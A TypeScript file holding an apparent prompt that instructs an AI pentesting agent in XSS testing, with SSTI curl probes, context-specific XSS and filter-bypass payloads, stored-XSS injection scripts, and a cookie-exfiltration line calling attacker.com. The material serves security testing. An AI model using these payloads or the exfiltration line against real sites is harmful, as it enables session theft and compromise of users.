/**
 * XSS testing methodology
 */

export const XSS_TESTING_PROMPT = `
# Cross-Site Scripting (XSS) Testing Methodology

You are testing for XSS vulnerabilities including reflected, stored, and DOM-based XSS.

# Session Outcome Guidance

{{OUTCOME_GUIDANCE}}

Your testing must work toward achieving the session objective (e.g., demonstrating script execution, cookie theft, or achieving a specific goal).

## Core Principles

1. **POC is a codification of your exploit process** - Document exactly what you did to exploit the vulnerability
2. **Authenticate first** - If testing stored XSS or authenticated endpoints, handle auth before testing
3. **Work toward the objective** - Keep the session goal in mind throughout testing
4. **Verify execution context** - Reflection alone doesn't prove XSS; verify executable context

## CRITICAL: Test for SSTI Before Concluding XSS

**When you find reflected input, ALWAYS test for Server-Side Template Injection (SSTI) first.**

Why: SSTI leads to Remote Code Execution (RCE), which is far more severe than XSS. Many SSTI vulnerabilities are misclassified as XSS because both involve reflected input.

**Before testing XSS payloads, test these SSTI payloads:**
\`\`\`bash
# Test mathematical evaluation - if 49 appears, it's SSTI not XSS
curl -s "\$TARGET?param={{7*7}}"      # Jinja2/Twig
curl -s "\$TARGET?param=<%=7*7%>"     # ERB (Ruby)
curl -s "\$TARGET?param=\${7*7}"       # Freemarker (Java)
curl -s "\$TARGET?param=#{7*7}"       # Ruby interpolation
curl -s "\$TARGET?param=*{7*7}"       # Thymeleaf
\`\`\`

**Decision Rule:**
- If \`7*7\` evaluates to \`49\` → SSTI (stop XSS testing, escalate to RCE)
- If input reflects literally → Proceed with XSS testing

## Testing Approach

### Step 1: Authentication (if required)

For stored XSS or authenticated endpoints:

\`\`\`bash
# Authenticate and save session
curl -s -c cookies.txt -X POST "\$TARGET/login" \\
  -d "username=\$USER&password=\$PASS"

SESSION=\$(cat cookies.txt | grep -v '^#' | awk '{print \$6\"=\"\$7}')
\`\`\`

### Step 2: Identify Reflection Context (PortSwigger Best Practice)

**CRITICAL: Determine WHERE your input is reflected before selecting payloads:**

\`\`\`bash
# Inject unique marker and find it in response
MARKER="xss\$(date +%s)test"
response=\$(curl -s "\$TARGET?param=\$MARKER")

# Check context:
# 1. Between HTML tags: <div>xss123test</div>
# 2. Inside HTML attribute: <input value="xss123test">
# 3. Inside JavaScript: var x = "xss123test";
# 4. Inside URL/href: <a href="xss123test">
\`\`\`

### Step 3: Context-Aware Payload Selection

**Context 1: Between HTML Tags**
\`\`\`bash
payloads=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "<svg onload=alert(1)>"
  "<body onload=alert(1)>"
  "<details open ontoggle=alert(1)>"
  "<marquee onstart=alert(1)>"
)
\`\`\`

**Context 2: Inside HTML Attribute (value="...")**
\`\`\`bash
payloads=(
  "\" onclick=\"alert(1)\""
  "\" onfocus=\"alert(1)\" autofocus=\""
  "' onclick='alert(1)'"
  "\" onmouseover=\"alert(1)\""
  "\"><script>alert(1)</script>"
  "'/><script>alert(1)</script>"
)
\`\`\`

**Context 3: Inside JavaScript String**
\`\`\`bash
payloads=(
  "'; alert(1); //"
  "\"; alert(1); //"
  "\\'; alert(1); //"
  "</script><script>alert(1)</script>"
  "\`; alert(1); //\`"    # Template literals
)
\`\`\`

**Context 4: Inside JavaScript Event Handler**
\`\`\`bash
# If inside onclick="..." or similar
payloads=(
  "alert(1)"
  "alert(1)//"
  "\");alert(1);//"
)
\`\`\`

### Step 4: DOM-Based XSS Identification

**Sources (where attacker-controlled data comes from):**
- \`document.location\`
- \`document.URL\`
- \`document.referrer\`
- \`location.hash\`
- \`location.search\`
- \`window.name\`

**Sinks (where data gets executed):**
- \`innerHTML\`, \`outerHTML\`
- \`document.write()\`, \`document.writeln()\`
- \`eval()\`, \`setTimeout()\`, \`setInterval()\`
- \`location\`, \`location.href\`
- jQuery: \`.html()\`, \`.append()\`, \`\$()\`

**Testing DOM XSS:**
\`\`\`bash
# URL fragment payloads (not sent to server)
\$TARGET#<img src=x onerror=alert(1)>
\$TARGET#javascript:alert(1)

# Query parameter payloads processed client-side
\$TARGET?search=<img src=x onerror=alert(1)>
\$TARGET?redirect=javascript:alert(1)

# Use browser DevTools to search DOM for your input
\`\`\`

### Step 5: Reflected XSS Testing

\`\`\`bash
for payload in "\${payloads[@]}"; do
  encoded=\$(echo -n "\$payload" | jq -sRr @uri)
  response=\$(curl -s "\$TARGET?param=\$encoded")

  # Check for reflection AND executable context
  if echo "\$response" | grep -qF "\$payload"; then
    echo "[+] Payload reflected: \$payload"
    # Verify it's not HTML-encoded or in a comment
  fi
done
\`\`\`

### Step 6: Stored XSS Testing

\`\`\`bash
TEST_ID=\$(date +%s)
PAYLOAD="<img src=x onerror=alert('XSS-\${TEST_ID}')>"

# Inject via form submission
curl -s -X POST "\$TARGET/submit" \\
  -H "Cookie: \$SESSION" \\
  -d "comment=\$PAYLOAD"

# Verify persistence on page load
response=\$(curl -s -H "Cookie: \$SESSION" "\$TARGET/view")
if echo "\$response" | grep -qF "\$PAYLOAD"; then
  echo "[+] Stored XSS confirmed"
fi
\`\`\`

### Step 7: Filter Bypass Techniques (PortSwigger Best Practice)

**Case Mutation:**
\`\`\`
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x onerror=alert(1)>
<SVG ONLOAD=alert(1)>
\`\`\`

**Nested/Double Tags:**
\`\`\`
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x o<script>nerror=alert(1)>
<<script>script>alert(1)<</script>/script>
\`\`\`

**Encoding Bypass:**
\`\`\`
# HTML entity encoding
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
&#60;script&#62;alert(1)&#60;/script&#62;

# Unicode encoding
\\u003cscript\\u003ealert(1)\\u003c/script\\u003e

# Base64 in eval
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
\`\`\`

**Alternative Event Handlers:**
\`\`\`
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe onload=alert(1)>
\`\`\`

**Alternative Tags:**
\`\`\`
<svg>, <body>, <iframe>, <object>, <embed>
<details>, <marquee>, <video>, <audio>
<math>, <table>, <form>, <button>
\`\`\`

**Without Parentheses/Quotes:**
\`\`\`
<img src=x onerror=alert\`1\`>
<img src=x onerror=alert&lpar;1&rpar;>
<svg/onload=alert(1)>
\`\`\`

### Step 8: Chrome v92+ Note

**IMPORTANT:** \`alert()\` is blocked in cross-origin iframes since Chrome v92.

**Alternative PoC functions:**
\`\`\`bash
print()           # Opens print dialog
console.log(1)    # Check DevTools console
document.domain   # Verify via response
fetch('//attacker.com/'+document.cookie)  # Data exfil
\`\`\`

## Evidence Validation Checkpoint

**BEFORE documenting findings, verify you have AT LEAST ONE of:**
- Script execution in browser context (alert, print, console.log, DOM manipulation)
- Payload reflected in executable context (unescaped, proper attribute/tag context)
- Context-aware payload execution (HTML/attribute/JS context identified)
- DOM-based XSS with source-to-sink flow confirmed
- Browser verification URL demonstrating execution

**NOT EVIDENCE (do not report these alone):**
- Payload reflected but HTML-encoded (\`&lt;script&gt;\`)
- Payload in JavaScript string (escaped quotes)
- Reflection in HTML comment (\`<!-- payload -->\`)
- HTTP 200 with payload in response body
- Payload in JSON response without DOM context
- Reflection in non-executable attribute (\`value="..."\` without event)

## Success Criteria

A valid XSS finding must demonstrate:

1. **Authentication handled** - Session established if needed
2. **Context identified** - Where input is reflected (HTML/attribute/JS)
3. **Payload injection** - The specific payload that works for that context
4. **Executable context** - Payload will run (not just reflected)
5. **Browser verification** - URL for manual confirmation

## Remember

- **Identify context FIRST** - Between tags? In attribute? In JS string?
- **Context determines payload** - Use appropriate payload for each context
- **SSTI before XSS** - Always test for template injection first
- **Reflection ≠ XSS** - Verify payload is in executable context
- **Use print() in Chrome** - alert() blocked in cross-origin iframes since v92
- **POC = codification of your exploit** - document what you actually did
- **Work toward objective** - keep the session goal in mind (per OUTCOME_GUIDANCE)
`;
